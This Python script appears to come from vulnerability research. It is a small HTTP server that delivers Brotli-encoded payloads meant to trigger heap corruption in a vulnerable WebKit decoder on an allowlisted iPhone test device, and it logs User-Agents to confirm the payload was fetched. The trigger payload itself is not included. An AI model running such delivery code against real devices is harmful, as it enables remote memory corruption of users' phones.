#!/usr/bin/env python3
"""Tiny HTTP server that serves Brotli-encoded bodies and logs who asked.

  /brtest  -> the Brotli body (reachability probe or the trigger payload)

Only requests from ALLOWED_FROM are served.  The research devices are the only
hosts allowed to fetch a payload; everything else on the network (including the
iPhone 6s+, which is explicitly off limits) is refused.

Every request is logged with its User-Agent, so we can tell whether the
WebKit networking process (distinctive UA) really fetched it.

The connection is aborted right after the body is written: the vulnerable
Brotli decoder turns the payload into unbounded output, and we do not want the
decoding daemon buffering gigabytes.  The heap corruption has already happened
by the time the body is fully delivered.
"""
import http.server
import os
import socket
import sys

ALLOWED_FROM = ("198.51.100.1",)      # the 13 Pro only
PAYLOADS = {}


class H(http.server.BaseHTTPRequestHandler):
    protocol_version = "HTTP/1.1"

    def log_message(self, fmt, *args):
        ua = self.headers.get("User-Agent", "?")
        print("REQ %s %s ua=%r" % (self.command, self.path, ua), flush=True)

    def do_GET(self):
        src = self.client_address[0]
        if src not in ALLOWED_FROM:
            print("REFUSED %s from %s (not in %s)" % (self.path, src, ALLOWED_FROM), flush=True)
            self.send_response(403)
            self.send_header("Content-Length", "0")
            self.end_headers()
            return
        path = self.path.split("?")[0]
        body = PAYLOADS.get(path)
        if body is None:
            self.send_response(404)
            self.send_header("Content-Length", "0")
            self.end_headers()
            return
        self.send_response(200)
        self.send_header("Content-Type", "text/html")
        self.send_header("Content-Encoding", "br")
        self.send_header("Content-Length", str(len(body)))
        self.end_headers()
        try:
            self.wfile.write(body)
            self.wfile.flush()
        except Exception as e:
            print("write failed:", e, flush=True)
        try:
            self.connection.shutdown(socket.SHUT_RDWR)
        except Exception:
            pass
        self.close_connection = True

    def do_HEAD(self):
        self.do_GET()


def main():
    for name in sys.argv[1:]:
        try:
            with open(name, "rb") as f:
                key = "/" + os.path.basename(name).split(".")[0]
                PAYLOADS[key] = f.read()
            print("serving %s (%d bytes) to %s only" % (key, len(PAYLOADS[key]), ALLOWED_FROM), flush=True)
        except Exception as e:
            print("skip", name, e, flush=True)
    srv = http.server.ThreadingHTTPServer(("0.0.0.0", 8777), H)
    print("listening on 8777 (allowlist %s)" % (ALLOWED_FROM,), flush=True)
    srv.serve_forever()


main()
